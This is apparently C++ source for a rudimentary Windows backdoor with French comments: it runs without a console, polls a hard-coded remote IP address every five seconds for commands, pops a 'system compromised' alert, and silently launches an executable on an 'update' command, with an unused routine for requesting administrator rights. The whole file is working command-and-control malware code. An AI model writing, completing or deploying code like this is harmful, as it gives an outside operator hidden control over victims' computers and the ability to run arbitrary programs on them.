#include <windows.h>
#include <wininet.h>
#include <tchar.h>
#include <thread>
#include <chrono>
#include <string>

using namespace std;

#pragma comment(lib, "wininet.lib")

void RequestAdminPrivileges() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID pAdminGroup;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminGroup)) {
        CheckTokenMembership(NULL, pAdminGroup, &isAdmin);
        FreeSid(pAdminGroup);
    }

    if (!isAdmin) {
        TCHAR szPath[MAX_PATH];
        GetModuleFileName(NULL, szPath, MAX_PATH);

        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = TEXT("runas");
        sei.lpFile = szPath;
        sei.hwnd = NULL;
        sei.nShow = SW_SHOWDEFAULT;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;

        if (!ShellExecuteEx(&sei)) {
            MessageBox(NULL, TEXT("Échec de l'obtention des droits administrateur !"), TEXT("Erreur"), MB_OK);
            exit(1);
        }
        exit(0);
    }
}

// Affiche une boîte de dialogue d'alerte.
void ShowMessage() {
    MessageBox(NULL, TEXT("Votre système est compromis !"), TEXT("Alerte"), MB_OK);
}

// Effectue une requête HTTP GET pour récupérer une commande depuis un serveur distant.
string GetCommand() {
    string command;

    HINTERNET hInternet = InternetOpenA("fishAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {

        HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://45.90.160.149:5000/command", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            char buffer[256];
            DWORD bytesRead = 0;

            if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                command = buffer;
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    MessageBox(NULL, command.c_str(), TEXT("Alerte"), MB_OK);
    return command;
}

// Fonction pour lançer les maj
void StartUpdate(const string& UpdaterPath) {
    ShellExecute(NULL, "open", UpdaterPath.c_str(), NULL, NULL, SW_HIDE);
}

// Thread qui interroge périodiquement le serveur pour vérifier la commande.
void ListenForCommand() {
    while (true) {
        string cmd = GetCommand();

        if (cmd == "show") {
            ShowMessage();
        }
        else if (cmd == "update") {
            StartUpdate("bite");
        }

        this_thread::sleep_for(chrono::seconds(5));
    }
}

// Point d'entrée de l'application Windows (aucune console ne sera affichée)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {


    thread listener(ListenForCommand);
    listener.detach();


    while (true) {
        this_thread::sleep_for(chrono::seconds(60));
    }

    return 0;
}
